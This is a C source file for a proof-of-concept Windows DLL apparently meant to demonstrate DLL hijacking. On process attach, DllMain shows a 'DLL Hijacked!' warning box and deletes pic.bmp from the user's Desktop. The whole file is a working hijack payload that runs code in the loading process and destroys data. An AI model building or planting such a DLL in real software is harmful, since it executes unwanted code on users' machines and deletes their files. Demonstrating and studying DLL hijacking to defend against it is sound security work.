#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <windows.h>

DWORD WINAPI deleteFile(LPVOID lpParam) {
    /*  Thanks to:
     *    https://stackoverflow.com/a/12065600
     *    http://joequery.me/code/environment-variable-c/
     *    http://joequery.me/code/snprintf-c/
     */
    char userprofile[256];
    snprintf(userprofile, sizeof(userprofile), "%s", getenv("USERPROFILE"));

    char Desktop_file[ sizeof(userprofile) + 100 ];
    snprintf(Desktop_file, sizeof(Desktop_file), "%s\\%s", userprofile, "\\Desktop\\pic.bmp");

    MessageBox(NULL, "ACHTUNG: DELETING pic.bmp on Desktop!!", "DLL Hijacked!",
               MB_ICONWARNING | MB_SYSTEMMODAL);
    remove(Desktop_file);

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD ul_reason_for_call,
                      LPVOID lpReserved) {
  switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        deleteFile(NULL);
      // CreateThread(NULL, NULL, MessageBoxThread, NULL, NULL, NULL);
      break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
      break;
  }

  return TRUE;
}
